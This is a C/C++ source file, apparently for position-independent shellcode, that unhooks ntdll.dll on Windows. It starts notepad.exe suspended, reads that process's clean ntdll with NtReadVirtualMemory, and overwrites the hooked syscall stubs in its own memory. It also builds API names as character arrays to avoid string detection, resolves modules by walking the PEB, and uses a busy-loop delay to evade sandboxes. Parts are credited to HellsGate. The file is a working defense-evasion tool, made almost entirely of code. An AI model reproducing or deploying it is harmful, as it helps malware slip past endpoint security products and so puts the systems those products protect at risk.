#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "functions.h"
#include "addresshunter.h"


void sleep()
{
	for (int i = 0; i <= 500000; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}


PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

char* strstrFunc(const char* string, const char* substring)
{
	const char *a, *b;

	/* First scan quickly through the two strings looking for a
	 * single-character match.  When it's found, then compare the
	 * rest of the substring.
	 */

	b = substring;

	if(*b == 0)
	{
		return (char*)string;
	}

	for(; *string != 0; string += 1)
	{
		if(*string != *b)
		{
			continue;
		}

		a = string;

		while(1)
		{
			if(*b == 0)
			{
				return (char*)string;
			}
			if(*a++ != *b++)
			{
				break;
			}
		}

		b = substring;
	}

	return NULL;
}

PVOID GetDll(PWSTR FindName)
{
    _PPEB ppeb = (_PPEB)__readgsqword(0x60);
    ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
    ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
    PVOID dllBase = NULL;

    ULONG_PTR val2;
    while (val1)
    {
        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
        dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
        if (my_strcmp((char*)FindName, (char*)DllName) == 0)
        {
            break;
        }
        val1 = DEREF_64(val1);
    }
    return dllBase;
}

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
    //Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
    PVOID funcAddress = 0x00;
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (my_strcmp(findfunction, pczFunctionName) == 0)
        {
            WORD cw = 0;
            while (TRUE)
            {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    return 0x00;
                }

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    return 0x00;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    WORD syscall = (high << 8) | low;
                    return pFunctionAddress;
                    break;
                }
                cw++;
            }
        }
    }
    return funcAddress;
}

DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
{
    UINT64 kernel32dll;
    kernel32dll = GetKernel32();
    DWORD oldprotect;
    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x00 };
    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    VirtualProtect_p(textBase, size, flProtect, &oldprotect);
    return oldprotect;
}

void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
    UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
    kernel32dll = GetKernel32();
    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};
    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00};

    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
    msvcrtdll = (UINT64) ((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);


    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (strstrFunc(pczFunctionName, (CHAR*)"Nt") != NULL)
        {
            PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
            if (funcAddress != 0x00 && my_strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
            {
                //Change the write permissions of the .text section of the ntdll in memory
                DWORD oldprotect = protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
                //Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
                CopyMemoryEx((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23);
                //Change back to the old permissions
                protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize);
            }
        }
    }
}

void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
    UINT64 kernel32dll = GetKernel32();
    UINT64 msvcrtdll, wprintfFunc, LoadLibraryAFunc;
    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};
    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00};
    msvcrtdll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00};
    wprintfFunc = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);

    WCHAR ErrorMessage[] =  { L'E', L'r', L'r', L'r', L'o', L'r', 0x00 };

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        ((WPRINTF)wprintfFunc)(ErrorMessage);
    
        

    PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
       ((WPRINTF)wprintfFunc)(ErrorMessage);

    WhatsOverwriting(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
}



extern "C" void exec(){
    //start process in a suspended state
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    UINT64 kernel32dll = GetKernel32();
    UINT64 msvcrtdll, wprintfFunc, LoadLibraryAFunc;

    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00};
    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    CHAR msvcrt_c[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00};
    msvcrtdll = (UINT64) ((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);
    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00};
    wprintfFunc = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);

    CHAR ntdll_c[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x00 };
    HMODULE ntdlldll = (HMODULE)((LOADLIBRARYA)LoadLibraryAFunc)(ntdll_c);

    CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
    CreateProcessA_t CreateProcessA_p = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);

    WCHAR aboutMe[] = { L'W', L'r', L'i', L't', L't', L'e', L'n', L' ', L'B', L'y', L' ', L'M', L'a', L'o', L'r',  L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(aboutMe);

    sleep();

    CreateProcessA_p(
        NULL, 
        (LPSTR)"notepad.exe", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 
        NULL,
        "C:\\Windows\\System32\\", 
        &si, 
        &pi
    );


    HANDLE hProcess = pi.hProcess;
    WCHAR PID_CHAR[] = { L'P', L'I', L'D', L' ', L':', L' ', L'%', L'd', L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(PID_CHAR, pi.dwProcessId);

    WCHAR findname[] = L"ntdll.dll\x00";


    PVOID ntdllBase = GetDll(findname);
    WCHAR NTbaseAddress[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L' ', L'b', L'a', L's', L'e', L' ', L'a', L'd', L'd', L'r', L'e', L's', L's', L' ', L':', L' ', L'0', L'x', L'%', L'p', L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(NTbaseAddress, ntdllBase);

    //Read the ntdll.dll from the remote suspended process
    PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ImgNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + (ImgDosHeader->e_lfanew));
    IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ImgNTHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ImgNTHeaders);

    DWORD ntdllSize = OptHeader.SizeOfImage;

    CHAR VirtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x00 };
    VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t)GetSymbolAddress((HANDLE)kernel32dll, VirtualAlloc_c);

    LPVOID freshNtdll = VirtualAlloc_p(NULL, ntdllSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesread = NULL;
    WCHAR freshNtdllChar[] = { L'F', L'r', L'e', L's', L'h', L' ', L'N', L'T', L'D', L'L', L'L', L' ', L':', L' ', L'0', L'x', L'%', L'p', L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(freshNtdllChar, freshNtdll);
    // printf("Fresh NTDLL : 0x%p\n", freshNtdll);
    CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };

    NtReadVirtualMemory_t NtReadVirtualMemory_p = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);

    NtReadVirtualMemory_p(hProcess, ntdllBase, freshNtdll, ntdllSize, &bytesread);

    //Re-writing the original ntdll.dll with the ntdll.dll read from suspended process
    WCHAR ReWriting[] = { L'R', L'e', L'-', L'W', L'r', L'i', L't', L'i', L'n', L'g', L' ', L't', L'h', L'e', L' ', L'o', L'r', L'i', L'g', L'i', L'n', L'a', L'l', L' ', L'n', L't', L'd', L'l', L'l',  L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(ReWriting);

    SomeReplacing(ntdllBase, freshNtdll, textsection);
    WCHAR terminateProcessChar[] ={ L'T', L'e', L'r', L'm', L'i', L'n', L'a', L't', L'i', L'n', L'g', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(terminateProcessChar);
    // printf("Terminating suspended process \n");
    
    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
    TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);

    TerminateProcessFunc(hProcess, 0);
    WCHAR done[] = { L'D', L'o', L'n', L'e', L' ', L'R', L'e', L'p', L'l', L'a', L'c', L'i', L'n', L'g', L' ', L't', L'h', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'u', L'n', L'c', L't', L'i', L'o', L'n', L'\n', 0x00 };
    ((WPRINTF)wprintfFunc)(done);
}